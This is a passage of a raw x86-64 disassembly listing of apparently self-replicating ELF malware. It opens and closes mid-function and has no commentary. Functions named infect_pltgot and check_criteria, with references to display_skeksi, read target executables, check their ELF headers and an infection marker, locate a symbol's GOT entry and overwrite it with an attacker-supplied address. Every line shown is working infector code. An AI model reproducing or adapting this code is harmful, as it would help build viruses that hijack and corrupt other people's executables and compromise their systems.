  401698:	48 8b 70 08          	mov    rsi,QWORD PTR [rax+0x8]
  40169c:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  40169f:	48 63 d0             	movsxd rdx,eax
  4016a2:	48 89 d0             	mov    rax,rdx
  4016a5:	48 c1 e0 03          	shl    rax,0x3
  4016a9:	48 29 d0             	sub    rax,rdx
  4016ac:	48 c1 e0 03          	shl    rax,0x3
  4016b0:	48 01 f0             	add    rax,rsi
  4016b3:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  4016b7:	48 8d 14 01          	lea    rdx,[rcx+rax*1]
  4016bb:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4016c2:	48 89 50 18          	mov    QWORD PTR [rax+0x18],rdx
  4016c6:	90                   	nop
  4016c7:	83 45 ec 01          	add    DWORD PTR [rbp-0x14],0x1
  4016cb:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4016d2:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4016d5:	0f b7 40 38          	movzx  eax,WORD PTR [rax+0x38]
  4016d9:	0f b7 c0             	movzx  eax,ax
  4016dc:	39 45 ec             	cmp    DWORD PTR [rbp-0x14],eax
  4016df:	0f 8c 30 fe ff ff    	jl     401515 <load_target_writeable+0x150>
  4016e5:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4016ec:	48 8b 8d 50 ff ff ff 	mov    rcx,QWORD PTR [rbp-0xb0]
  4016f3:	48 8b 9d 58 ff ff ff 	mov    rbx,QWORD PTR [rbp-0xa8]
  4016fa:	48 89 48 68          	mov    QWORD PTR [rax+0x68],rcx
  4016fe:	48 89 58 70          	mov    QWORD PTR [rax+0x70],rbx
  401702:	48 8b 8d 60 ff ff ff 	mov    rcx,QWORD PTR [rbp-0xa0]
  401709:	48 8b 9d 68 ff ff ff 	mov    rbx,QWORD PTR [rbp-0x98]
  401710:	48 89 48 78          	mov    QWORD PTR [rax+0x78],rcx
  401714:	48 89 98 80 00 00 00 	mov    QWORD PTR [rax+0x80],rbx
  40171b:	48 8b 8d 70 ff ff ff 	mov    rcx,QWORD PTR [rbp-0x90]
  401722:	48 8b 9d 78 ff ff ff 	mov    rbx,QWORD PTR [rbp-0x88]
  401729:	48 89 88 88 00 00 00 	mov    QWORD PTR [rax+0x88],rcx
  401730:	48 89 98 90 00 00 00 	mov    QWORD PTR [rax+0x90],rbx
  401737:	48 8b 4d 80          	mov    rcx,QWORD PTR [rbp-0x80]
  40173b:	48 8b 5d 88          	mov    rbx,QWORD PTR [rbp-0x78]
  40173f:	48 89 88 98 00 00 00 	mov    QWORD PTR [rax+0x98],rcx
  401746:	48 89 98 a0 00 00 00 	mov    QWORD PTR [rax+0xa0],rbx
  40174d:	48 8b 4d 90          	mov    rcx,QWORD PTR [rbp-0x70]
  401751:	48 8b 5d 98          	mov    rbx,QWORD PTR [rbp-0x68]
  401755:	48 89 88 a8 00 00 00 	mov    QWORD PTR [rax+0xa8],rcx
  40175c:	48 89 98 b0 00 00 00 	mov    QWORD PTR [rax+0xb0],rbx
  401763:	48 8b 4d a0          	mov    rcx,QWORD PTR [rbp-0x60]
  401767:	48 8b 5d a8          	mov    rbx,QWORD PTR [rbp-0x58]
  40176b:	48 89 88 b8 00 00 00 	mov    QWORD PTR [rax+0xb8],rcx
  401772:	48 89 98 c0 00 00 00 	mov    QWORD PTR [rax+0xc0],rbx
  401779:	48 8b 4d b0          	mov    rcx,QWORD PTR [rbp-0x50]
  40177d:	48 8b 5d b8          	mov    rbx,QWORD PTR [rbp-0x48]
  401781:	48 89 88 c8 00 00 00 	mov    QWORD PTR [rax+0xc8],rcx
  401788:	48 89 98 d0 00 00 00 	mov    QWORD PTR [rax+0xd0],rbx
  40178f:	48 8b 4d c0          	mov    rcx,QWORD PTR [rbp-0x40]
  401793:	48 8b 5d c8          	mov    rbx,QWORD PTR [rbp-0x38]
  401797:	48 89 88 d8 00 00 00 	mov    QWORD PTR [rax+0xd8],rcx
  40179e:	48 89 98 e0 00 00 00 	mov    QWORD PTR [rax+0xe0],rbx
  4017a5:	48 8b 4d d0          	mov    rcx,QWORD PTR [rbp-0x30]
  4017a9:	48 8b 5d d8          	mov    rbx,QWORD PTR [rbp-0x28]
  4017ad:	48 89 88 e8 00 00 00 	mov    QWORD PTR [rax+0xe8],rcx
  4017b4:	48 89 98 f0 00 00 00 	mov    QWORD PTR [rax+0xf0],rbx
  4017bb:	48 8b 45 80          	mov    rax,QWORD PTR [rbp-0x80]
  4017bf:	48 89 c2             	mov    rdx,rax
  4017c2:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4017c9:	48 89 50 58          	mov    QWORD PTR [rax+0x58],rdx
  4017cd:	b8 00 00 00 00       	mov    eax,0x0
  4017d2:	48 81 c4 b8 00 00 00 	add    rsp,0xb8
  4017d9:	5b                   	pop    rbx
  4017da:	5d                   	pop    rbp
  4017db:	c3                   	ret    

00000000004017dc <infect_pltgot>:
  4017dc:	f3 0f 1e fa          	endbr64 
  4017e0:	55                   	push   rbp
  4017e1:	48 89 e5             	mov    rbp,rsp
  4017e4:	48 83 ec 70          	sub    rsp,0x70
  4017e8:	48 89 7d 98          	mov    QWORD PTR [rbp-0x68],rdi
  4017ec:	48 89 75 90          	mov    QWORD PTR [rbp-0x70],rsi
  4017f0:	c7 45 b4 00 00 00 00 	mov    DWORD PTR [rbp-0x4c],0x0
  4017f7:	c7 45 f8 ff ff ff ff 	mov    DWORD PTR [rbp-0x8],0xffffffff
  4017fe:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  401802:	48 8b 40 18          	mov    rax,QWORD PTR [rax+0x18]
  401806:	48 89 45 a8          	mov    QWORD PTR [rbp-0x58],rax
  40180a:	48 c7 45 c0 00 00 00 	mov    QWORD PTR [rbp-0x40],0x0
  401811:	00 
  401812:	48 c7 45 b8 00 00 00 	mov    QWORD PTR [rbp-0x48],0x0
  401819:	00 
  40181a:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  401821:	e9 67 01 00 00       	jmp    40198d <infect_pltgot+0x1b1>
  401826:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401829:	48 98                	cdqe   
  40182b:	48 c1 e0 04          	shl    rax,0x4
  40182f:	48 89 c2             	mov    rdx,rax
  401832:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  401836:	48 01 d0             	add    rax,rdx
  401839:	48 8b 00             	mov    rax,QWORD PTR [rax]
  40183c:	48 83 f8 17          	cmp    rax,0x17
  401840:	0f 87 43 01 00 00    	ja     401989 <infect_pltgot+0x1ad>
  401846:	48 8d 14 85 00 00 00 	lea    rdx,[rax*4+0x0]
  40184d:	00 
  40184e:	48 8d 05 db 15 00 00 	lea    rax,[rip+0x15db]        # 402e30 <display_skeksi+0xb2>
  401855:	8b 04 02             	mov    eax,DWORD PTR [rdx+rax*1]
  401858:	48 98                	cdqe   
  40185a:	48 8d 15 cf 15 00 00 	lea    rdx,[rip+0x15cf]        # 402e30 <display_skeksi+0xb2>
  401861:	48 01 d0             	add    rax,rdx
  401864:	3e ff e0             	notrack jmp rax
  401867:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  40186b:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  40186f:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401872:	48 98                	cdqe   
  401874:	48 c1 e0 04          	shl    rax,0x4
  401878:	48 89 c1             	mov    rcx,rax
  40187b:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  40187f:	48 01 c8             	add    rax,rcx
  401882:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  401886:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  40188a:	48 8b 40 20          	mov    rax,QWORD PTR [rax+0x20]
  40188e:	48 29 c1             	sub    rcx,rax
  401891:	48 89 c8             	mov    rax,rcx
  401894:	48 01 d0             	add    rax,rdx
  401897:	48 89 45 f0          	mov    QWORD PTR [rbp-0x10],rax
  40189b:	e9 e9 00 00 00       	jmp    401989 <infect_pltgot+0x1ad>
  4018a0:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  4018a4:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  4018a8:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  4018ac:	48 8b 48 40          	mov    rcx,QWORD PTR [rax+0x40]
  4018b0:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4018b3:	48 98                	cdqe   
  4018b5:	48 c1 e0 04          	shl    rax,0x4
  4018b9:	48 89 c6             	mov    rsi,rax
  4018bc:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  4018c0:	48 01 f0             	add    rax,rsi
  4018c3:	48 8b 70 08          	mov    rsi,QWORD PTR [rax+0x8]
  4018c7:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  4018cb:	48 8b 40 28          	mov    rax,QWORD PTR [rax+0x28]
  4018cf:	48 29 c6             	sub    rsi,rax
  4018d2:	48 89 f0             	mov    rax,rsi
  4018d5:	48 01 c8             	add    rax,rcx
  4018d8:	48 01 d0             	add    rax,rdx
  4018db:	48 89 45 e0          	mov    QWORD PTR [rbp-0x20],rax
  4018df:	e9 a5 00 00 00       	jmp    401989 <infect_pltgot+0x1ad>
  4018e4:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  4018e8:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  4018ec:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4018ef:	48 98                	cdqe   
  4018f1:	48 c1 e0 04          	shl    rax,0x4
  4018f5:	48 89 c1             	mov    rcx,rax
  4018f8:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  4018fc:	48 01 c8             	add    rax,rcx
  4018ff:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  401903:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  401907:	48 8b 40 20          	mov    rax,QWORD PTR [rax+0x20]
  40190b:	48 29 c1             	sub    rcx,rax
  40190e:	48 89 c8             	mov    rax,rcx
  401911:	48 01 d0             	add    rax,rdx
  401914:	48 89 45 d8          	mov    QWORD PTR [rbp-0x28],rax
  401918:	eb 6f                	jmp    401989 <infect_pltgot+0x1ad>
  40191a:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  40191d:	48 98                	cdqe   
  40191f:	48 c1 e0 04          	shl    rax,0x4
  401923:	48 89 c2             	mov    rdx,rax
  401926:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  40192a:	48 01 d0             	add    rax,rdx
  40192d:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  401931:	48 89 45 d0          	mov    QWORD PTR [rbp-0x30],rax
  401935:	eb 52                	jmp    401989 <infect_pltgot+0x1ad>
  401937:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  40193b:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  40193f:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401942:	48 98                	cdqe   
  401944:	48 c1 e0 04          	shl    rax,0x4
  401948:	48 89 c1             	mov    rcx,rax
  40194b:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  40194f:	48 01 c8             	add    rax,rcx
  401952:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  401956:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  40195a:	48 8b 40 20          	mov    rax,QWORD PTR [rax+0x20]
  40195e:	48 29 c1             	sub    rcx,rax
  401961:	48 89 c8             	mov    rax,rcx
  401964:	48 01 d0             	add    rax,rdx
  401967:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  40196b:	eb 1c                	jmp    401989 <infect_pltgot+0x1ad>
  40196d:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401970:	48 98                	cdqe   
  401972:	48 c1 e0 04          	shl    rax,0x4
  401976:	48 89 c2             	mov    rdx,rax
  401979:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  40197d:	48 01 d0             	add    rax,rdx
  401980:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  401984:	48 89 45 c8          	mov    QWORD PTR [rbp-0x38],rax
  401988:	90                   	nop
  401989:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  40198d:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401990:	48 98                	cdqe   
  401992:	48 c1 e0 04          	shl    rax,0x4
  401996:	48 89 c2             	mov    rdx,rax
  401999:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  40199d:	48 01 d0             	add    rax,rdx
  4019a0:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4019a3:	48 85 c0             	test   rax,rax
  4019a6:	0f 85 7a fe ff ff    	jne    401826 <infect_pltgot+0x4a>
  4019ac:	48 83 7d f0 00       	cmp    QWORD PTR [rbp-0x10],0x0
  4019b1:	74 07                	je     4019ba <infect_pltgot+0x1de>
  4019b3:	48 83 7d e0 00       	cmp    QWORD PTR [rbp-0x20],0x0
  4019b8:	75 0a                	jne    4019c4 <infect_pltgot+0x1e8>
  4019ba:	b8 ff ff ff ff       	mov    eax,0xffffffff
  4019bf:	e9 af 01 00 00       	jmp    401b73 <infect_pltgot+0x397>
  4019c4:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  4019cb:	eb 47                	jmp    401a14 <infect_pltgot+0x238>
  4019cd:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4019d0:	48 63 d0             	movsxd rdx,eax
  4019d3:	48 89 d0             	mov    rax,rdx
  4019d6:	48 01 c0             	add    rax,rax
  4019d9:	48 01 d0             	add    rax,rdx
  4019dc:	48 c1 e0 03          	shl    rax,0x3
  4019e0:	48 89 c2             	mov    rdx,rax
  4019e3:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  4019e7:	48 01 d0             	add    rax,rdx
  4019ea:	8b 00                	mov    eax,DWORD PTR [rax]
  4019ec:	89 c2                	mov    edx,eax
  4019ee:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  4019f2:	48 01 d0             	add    rax,rdx
  4019f5:	48 8d 35 2c 14 00 00 	lea    rsi,[rip+0x142c]        # 402e28 <display_skeksi+0xaa>
  4019fc:	48 89 c7             	mov    rdi,rax
  4019ff:	e8 85 12 00 00       	call   402c89 <_strcmp>
  401a04:	85 c0                	test   eax,eax
  401a06:	75 08                	jne    401a10 <infect_pltgot+0x234>
  401a08:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401a0b:	89 45 f8             	mov    DWORD PTR [rbp-0x8],eax
  401a0e:	eb 2b                	jmp    401a3b <infect_pltgot+0x25f>
  401a10:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  401a14:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401a17:	48 63 d0             	movsxd rdx,eax
  401a1a:	48 89 d0             	mov    rax,rdx
  401a1d:	48 01 c0             	add    rax,rax
  401a20:	48 01 d0             	add    rax,rdx
  401a23:	48 c1 e0 03          	shl    rax,0x3
  401a27:	48 89 c2             	mov    rdx,rax
  401a2a:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  401a2e:	48 01 d0             	add    rax,rdx
  401a31:	8b 00                	mov    eax,DWORD PTR [rax]
  401a33:	89 c0                	mov    eax,eax
  401a35:	48 39 45 d0          	cmp    QWORD PTR [rbp-0x30],rax
  401a39:	73 92                	jae    4019cd <infect_pltgot+0x1f1>
  401a3b:	83 7d f8 ff          	cmp    DWORD PTR [rbp-0x8],0xffffffff
  401a3f:	75 0a                	jne    401a4b <infect_pltgot+0x26f>
  401a41:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401a46:	e9 28 01 00 00       	jmp    401b73 <infect_pltgot+0x397>
  401a4b:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  401a52:	e9 c4 00 00 00       	jmp    401b1b <infect_pltgot+0x33f>
  401a57:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401a5a:	48 63 d0             	movsxd rdx,eax
  401a5d:	48 89 d0             	mov    rax,rdx
  401a60:	48 01 c0             	add    rax,rax
  401a63:	48 01 d0             	add    rax,rdx
  401a66:	48 c1 e0 03          	shl    rax,0x3
  401a6a:	48 89 c2             	mov    rdx,rax
  401a6d:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401a71:	48 01 d0             	add    rax,rdx
  401a74:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  401a78:	48 c1 e8 20          	shr    rax,0x20
  401a7c:	48 89 c2             	mov    rdx,rax
  401a7f:	48 89 d0             	mov    rax,rdx
  401a82:	48 01 c0             	add    rax,rax
  401a85:	48 01 d0             	add    rax,rdx
  401a88:	48 c1 e0 03          	shl    rax,0x3
  401a8c:	48 89 c2             	mov    rdx,rax
  401a8f:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  401a93:	48 01 d0             	add    rax,rdx
  401a96:	8b 00                	mov    eax,DWORD PTR [rax]
  401a98:	89 c2                	mov    edx,eax
  401a9a:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  401a9e:	48 01 d0             	add    rax,rdx
  401aa1:	48 8d 35 80 13 00 00 	lea    rsi,[rip+0x1380]        # 402e28 <display_skeksi+0xaa>
  401aa8:	48 89 c7             	mov    rdi,rax
  401aab:	e8 d9 11 00 00       	call   402c89 <_strcmp>
  401ab0:	85 c0                	test   eax,eax
  401ab2:	75 63                	jne    401b17 <infect_pltgot+0x33b>
  401ab4:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401ab7:	48 63 d0             	movsxd rdx,eax
  401aba:	48 89 d0             	mov    rax,rdx
  401abd:	48 01 c0             	add    rax,rax
  401ac0:	48 01 d0             	add    rax,rdx
  401ac3:	48 c1 e0 03          	shl    rax,0x3
  401ac7:	48 89 c2             	mov    rdx,rax
  401aca:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401ace:	48 01 d0             	add    rax,rdx
  401ad1:	48 8b 00             	mov    rax,QWORD PTR [rax]
  401ad4:	48 89 45 c0          	mov    QWORD PTR [rbp-0x40],rax
  401ad8:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  401adc:	48 8b 48 40          	mov    rcx,QWORD PTR [rax+0x40]
  401ae0:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401ae3:	48 63 d0             	movsxd rdx,eax
  401ae6:	48 89 d0             	mov    rax,rdx
  401ae9:	48 01 c0             	add    rax,rax
  401aec:	48 01 d0             	add    rax,rdx
  401aef:	48 c1 e0 03          	shl    rax,0x3
  401af3:	48 89 c2             	mov    rdx,rax
  401af6:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401afa:	48 01 d0             	add    rax,rdx
  401afd:	48 8b 10             	mov    rdx,QWORD PTR [rax]
  401b00:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  401b04:	48 8b 40 28          	mov    rax,QWORD PTR [rax+0x28]
  401b08:	48 29 c2             	sub    rdx,rax
  401b0b:	48 89 d0             	mov    rax,rdx
  401b0e:	48 01 c8             	add    rax,rcx
  401b11:	48 89 45 b8          	mov    QWORD PTR [rbp-0x48],rax
  401b15:	eb 2b                	jmp    401b42 <infect_pltgot+0x366>
  401b17:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  401b1b:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401b1e:	48 63 c8             	movsxd rcx,eax
  401b21:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  401b25:	48 ba ab aa aa aa aa 	movabs rdx,0xaaaaaaaaaaaaaaab
  401b2c:	aa aa aa 
  401b2f:	48 f7 e2             	mul    rdx
  401b32:	48 89 d0             	mov    rax,rdx
  401b35:	48 c1 e8 04          	shr    rax,0x4
  401b39:	48 39 c1             	cmp    rcx,rax
  401b3c:	0f 82 15 ff ff ff    	jb     401a57 <infect_pltgot+0x27b>
  401b42:	48 83 7d c0 00       	cmp    QWORD PTR [rbp-0x40],0x0
  401b47:	75 07                	jne    401b50 <infect_pltgot+0x374>
  401b49:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401b4e:	eb 23                	jmp    401b73 <infect_pltgot+0x397>
  401b50:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  401b54:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  401b58:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  401b5c:	48 01 d0             	add    rax,rdx
  401b5f:	48 89 45 a0          	mov    QWORD PTR [rbp-0x60],rax
  401b63:	48 8b 45 a0          	mov    rax,QWORD PTR [rbp-0x60]
  401b67:	48 8b 55 90          	mov    rdx,QWORD PTR [rbp-0x70]
  401b6b:	48 89 10             	mov    QWORD PTR [rax],rdx
  401b6e:	b8 00 00 00 00       	mov    eax,0x0
  401b73:	c9                   	leave  
  401b74:	c3                   	ret    

0000000000401b75 <check_criteria>:
  401b75:	f3 0f 1e fa          	endbr64 
  401b79:	55                   	push   rbp
  401b7a:	48 89 e5             	mov    rbp,rsp
  401b7d:	48 81 ec 00 10 00 00 	sub    rsp,0x1000
  401b84:	48 83 0c 24 00       	or     QWORD PTR [rsp],0x0
  401b89:	48 81 ec d0 00 00 00 	sub    rsp,0xd0
  401b90:	48 89 bd 38 ef ff ff 	mov    QWORD PTR [rbp-0x10c8],rdi
  401b97:	c7 45 f4 00 00 00 00 	mov    DWORD PTR [rbp-0xc],0x0
  401b9e:	48 8b 85 38 ef ff ff 	mov    rax,QWORD PTR [rbp-0x10c8]
  401ba5:	ba 00 00 00 00       	mov    edx,0x0
  401baa:	be 00 00 00 00       	mov    esi,0x0
  401baf:	48 89 c7             	mov    rdi,rax
  401bb2:	e8 0a 05 00 00       	call   4020c1 <_open>
  401bb7:	89 45 f0             	mov    DWORD PTR [rbp-0x10],eax
  401bba:	83 7d f0 00          	cmp    DWORD PTR [rbp-0x10],0x0
  401bbe:	79 0a                	jns    401bca <check_criteria+0x55>
  401bc0:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401bc5:	e9 27 01 00 00       	jmp    401cf1 <check_criteria+0x17c>
  401bca:	8b 45 f0             	mov    eax,DWORD PTR [rbp-0x10]
  401bcd:	48 98                	cdqe   
  401bcf:	48 8d 8d 40 ef ff ff 	lea    rcx,[rbp-0x10c0]
  401bd6:	ba 00 10 00 00       	mov    edx,0x1000
  401bdb:	48 89 ce             	mov    rsi,rcx
  401bde:	48 89 c7             	mov    rdi,rax
  401be1:	e8 2f 05 00 00       	call   402115 <_read>
  401be6:	85 c0                	test   eax,eax
  401be8:	79 0a                	jns    401bf4 <check_criteria+0x7f>
  401bea:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401bef:	e9 fd 00 00 00       	jmp    401cf1 <check_criteria+0x17c>
  401bf4:	8b 45 f0             	mov    eax,DWORD PTR [rbp-0x10]
  401bf7:	89 c7                	mov    edi,eax
  401bf9:	e8 f9 04 00 00       	call   4020f7 <_close>
  401bfe:	48 8d 85 40 ef ff ff 	lea    rax,[rbp-0x10c0]
  401c05:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  401c09:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401c0d:	48 8b 40 20          	mov    rax,QWORD PTR [rax+0x20]
  401c11:	48 8d 95 40 ef ff ff 	lea    rdx,[rbp-0x10c0]
  401c18:	48 01 d0             	add    rax,rdx
  401c1b:	48 89 45 e0          	mov    QWORD PTR [rbp-0x20],rax
  401c1f:	48 8d 85 40 ef ff ff 	lea    rax,[rbp-0x10c0]
  401c26:	ba 04 00 00 00       	mov    edx,0x4
  401c2b:	48 89 c6             	mov    rsi,rax
  401c2e:	48 8d 3d 5b 12 00 00 	lea    rdi,[rip+0x125b]        # 402e90 <display_skeksi+0x112>
  401c35:	e8 af 10 00 00       	call   402ce9 <_memcmp>
  401c3a:	85 c0                	test   eax,eax
  401c3c:	74 0a                	je     401c48 <check_criteria+0xd3>
  401c3e:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401c43:	e9 a9 00 00 00       	jmp    401cf1 <check_criteria+0x17c>
  401c48:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401c4c:	48 83 c0 09          	add    rax,0x9
  401c50:	8b 00                	mov    eax,DWORD PTR [rax]
  401c52:	89 45 dc             	mov    DWORD PTR [rbp-0x24],eax
  401c55:	81 7d dc 25 5d 01 00 	cmp    DWORD PTR [rbp-0x24],0x15d25
  401c5c:	75 0a                	jne    401c68 <check_criteria+0xf3>
  401c5e:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401c63:	e9 89 00 00 00       	jmp    401cf1 <check_criteria+0x17c>
  401c68:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401c6c:	0f b7 40 10          	movzx  eax,WORD PTR [rax+0x10]
  401c70:	66 83 f8 02          	cmp    ax,0x2
  401c74:	74 07                	je     401c7d <check_criteria+0x108>
  401c76:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401c7b:	eb 74                	jmp    401cf1 <check_criteria+0x17c>
  401c7d:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401c81:	0f b7 40 12          	movzx  eax,WORD PTR [rax+0x12]
  401c85:	66 83 f8 3e          	cmp    ax,0x3e
  401c89:	74 07                	je     401c92 <check_criteria+0x11d>
  401c8b:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401c90:	eb 5f                	jmp    401cf1 <check_criteria+0x17c>
  401c92:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  401c99:	c7 45 f8 00 00 00 00 	mov    DWORD PTR [rbp-0x8],0x0
  401ca0:	eb 2d                	jmp    401ccf <check_criteria+0x15a>
  401ca2:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  401ca5:	48 63 d0             	movsxd rdx,eax
  401ca8:	48 89 d0             	mov    rax,rdx
  401cab:	48 c1 e0 03          	shl    rax,0x3
  401caf:	48 29 d0             	sub    rax,rdx
  401cb2:	48 c1 e0 03          	shl    rax,0x3
  401cb6:	48 89 c2             	mov    rdx,rax
  401cb9:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  401cbd:	48 01 d0             	add    rax,rdx
  401cc0:	8b 00                	mov    eax,DWORD PTR [rax]
  401cc2:	83 f8 02             	cmp    eax,0x2
  401cc5:	75 04                	jne    401ccb <check_criteria+0x156>
  401cc7:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  401ccb:	83 45 f8 01          	add    DWORD PTR [rbp-0x8],0x1
  401ccf:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401cd3:	0f b7 40 38          	movzx  eax,WORD PTR [rax+0x38]
  401cd7:	0f b7 c0             	movzx  eax,ax
  401cda:	39 45 f8             	cmp    DWORD PTR [rbp-0x8],eax
  401cdd:	7c c3                	jl     401ca2 <check_criteria+0x12d>
  401cdf:	83 7d fc 00          	cmp    DWORD PTR [rbp-0x4],0x0
  401ce3:	75 07                	jne    401cec <check_criteria+0x177>
  401ce5:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401cea:	eb 05                	jmp    401cf1 <check_criteria+0x17c>
  401cec:	b8 00 00 00 00       	mov    eax,0x0
  401cf1:	c9                   	leave  
  401cf2:	c3                   	ret    

0000000000401cf3 <do_main>:
  401cf3:	f3 0f 1e fa          	endbr64 
  401cf7:	55                   	push   rbp
  401cf8:	48 89 e5             	mov    rbp,rsp
  401cfb:	4c 8d 9c 24 00 80 ff 	lea    r11,[rsp-0x8000]
  401d02:	ff 
  401d03:	48 81 ec 00 10 00 00 	sub    rsp,0x1000
  401d0a:	48 83 0c 24 00       	or     QWORD PTR [rsp],0x0
  401d0f:	4c 39 dc             	cmp    rsp,r11
  401d12:	75 ef                	jne    401d03 <do_main+0x10>
  401d14:	48 81 ec 60 03 00 00 	sub    rsp,0x360
  401d1b:	48 89 bd a8 7c ff ff 	mov    QWORD PTR [rbp-0x8358],rdi
  401d22:	48 c7 45 90 00 00 00 	mov    QWORD PTR [rbp-0x70],0x0
  401d29:	00 
  401d2a:	48 c7 45 e8 00 00 00 	mov    QWORD PTR [rbp-0x18],0x0
  401d31:	00 
  401d32:	c7 45 f8 04 00 00 00 	mov    DWORD PTR [rbp-0x8],0x4
  401d39:	c7 45 f4 00 00 00 00 	mov    DWORD PTR [rbp-0xc],0x0
  401d40:	48 8d 05 4e 11 00 00 	lea    rax,[rip+0x114e]        # 402e95 <display_skeksi+0x117>
  401d47:	48 89 85 e0 7c ff ff 	mov    QWORD PTR [rbp-0x8320],rax
  401d4e:	48 8d 05 46 11 00 00 	lea    rax,[rip+0x1146]        # 402e9b <display_skeksi+0x11d>
  401d55:	48 89 85 e8 7c ff ff 	mov    QWORD PTR [rbp-0x8318],rax
  401d5c:	48 8d 05 42 11 00 00 	lea    rax,[rip+0x1142]        # 402ea5 <display_skeksi+0x127>
  401d63:	48 89 85 f0 7c ff ff 	mov    QWORD PTR [rbp-0x8310],rax
  401d6a:	48 8d 05 39 11 00 00 	lea    rax,[rip+0x1139]        # 402eaa <display_skeksi+0x12c>
